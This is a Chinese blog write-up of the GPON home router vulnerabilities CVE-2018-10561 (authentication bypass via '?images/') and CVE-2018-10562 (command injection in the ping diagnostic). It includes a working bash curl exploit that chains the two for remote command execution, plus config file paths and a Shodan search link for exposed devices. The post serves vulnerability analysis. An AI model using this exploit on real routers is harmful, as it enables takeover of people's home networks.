> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [delikely.github.io](https://delikely.github.io/2018/05/03/GPON%E5%85%89%E7%BA%A4%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%EF%BC%9A%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-10561%EF%BC%89%E5%92%8C%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-10562%EF%BC%89/)

> GPON 技术是现在非常流行的光纤无光源网络设备技术，国内主流运营商的家庭网关大多都采用 GPON 和 EPON 技术。

GPON 技术是现在非常流行的光纤无光源网络设备技术，国内主流运营商的家庭网关大多都采用 GPON 和 EPON 技术。国内 GPON 光纤路由器因为由 ISP 提供，暴露公网存量不明显，但仍可能收到该漏洞影响。此次由 VPNMentor 披露的 GPON 家用光纤路由器漏洞，分别涉及到身份认证绕过漏洞 (CVE-2018-10561) 和命令注入漏洞（CVE-2018-10562），两个漏洞形成的攻击链可以在设备上执行任意系统命令。

**GPON 模式家庭设备网关**

![](https://delikely.github.io/2018/05/03/GPON%E5%85%89%E7%BA%A4%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%EF%BC%9A%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-10561%EF%BC%89%E5%92%8C%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-10562%EF%BC%89/1525415567679.png)

[](#身份认证绕过（CVE-2018-10561） "身份认证绕过（CVE-2018-10561）")身份认证绕过（CVE-2018-10561）
--------------------------------------------------------------------------

设备上运行的 HTTP 服务器在进行身份验证时会检查特定路径，攻击者可以利用这一特性绕过任意终端上的身份验证。

通过在 URL 后添加特定参数`?images/`，最终获得访问权限：

> [http://ip:port/menu.html?images/](http://ip:port/menu.html?images/)
> 
> [http://ip:port/GponForm/diag_FORM?images/](http://ip:port/GponForm/diag_FORM?images/)

另外，URL 中含有 style/,script/ 时也可绕过验证。

[](#命令注入（CVE-2018-10562） "命令注入（CVE-2018-10562）")命令注入（CVE-2018-10562）
--------------------------------------------------------------------

该设备提供了诊断功能，通过`ping`和`traceroute`对设备进行诊断，但并未对用户输入进行检测，直接通过拼接参数的形式进行执行导致了命令注入，通过反引号 ` 和分号; 可以进行常规命令注入执行。

该诊断功能会在`/tmp`目录保存命令执行结果并在用户访问`/diag.html`时返回结果，所以结合 CVE-2018-10561 身份认证绕过漏洞可以轻松获取执行结果。

### [](#Exploit "Exploit")Exploit

```
#!/bin/bash
# Usage: sh exp.sh url command
curl -k -d "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=\`$2\`;$2&ipv=0" $1/GponForm/diag_Form?images/ 2>/dev/null 1>/dev/null
echo "[+] Waiting...."
sleep 3
echo "[+] Retrieving the ouput...."
curl -k $1/diag.html?images/ 2>/dev/null | grep 'diag_result = ' | sed -e 's/\\n/\n/g'
```

[](#漏洞利用-amp-疑问 "漏洞利用&疑问")漏洞利用 & 疑问
-----------------------------------

### [](#404-not-found-？ "404 not found ？")404 not found ？

URL 后面添加了`?images/`使用浏览器访问大多会报 **404 Not found.** 。

![](https://delikely.github.io/2018/05/03/GPON%E5%85%89%E7%BA%A4%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%EF%BC%9A%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-10561%EF%BC%89%E5%92%8C%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-10562%EF%BC%89/1525418932723.png)

查看源码发现是函数 XWebInit 中判断了当前窗口是否为最顶层的框架。Web 管理页面由多个 html 页面组合而成，单独显示是被不允许的。我尝试用 burp 修改返回包，但显示仍然不完全。需要修改查看相关配置，建议直接对配置文件操作或执行相关命令。

```
function XWebInit()
{
	if (self == top)
	{
		$("x_root_body").innerHTML = '<center><h2><p>404 Not found.</p></h2></center>';
		return;
	}
	WebLoadString();
	WebInit();
	setTimeout("XLogout();", top.XWebTimeout*1000);
	InitForm(top.XCurrentMenu);
}


</script>
</head>
<body onload="XWebInit();">
<form >
<input  />
<div>
	<div></div>
	<div>
```

### [](#关键文件 "关键文件")关键文件

*   web 路径: /web/html
*   身份认证等配置：/etc/ath0.conf

[](#时间线 "时间线")时间线
-----------------

*   2018-05-01 vpnmentor 披露该漏洞

[](#参考 "参考")参考
--------------

*   [Critical RCE Vulnerability Found in Over a Million GPON Home Routers](https://www.vpnmentor.com/blog/critical-vulnerability-gpon-router/)
*   [GPON Home Gateway 远程命令执行漏洞分析](https://paper.seebug.org/593/)
*   [CVE-2018-10561/62: GPON 光纤路由器漏洞分析预警](https://cert.360.cn/warning/detail?id=95110cde8635056292e62424b9da1842)
*   [shodan 搜索结果](https://www.shodan.io/search?query=title%3A%22GPON+home+gateway%22)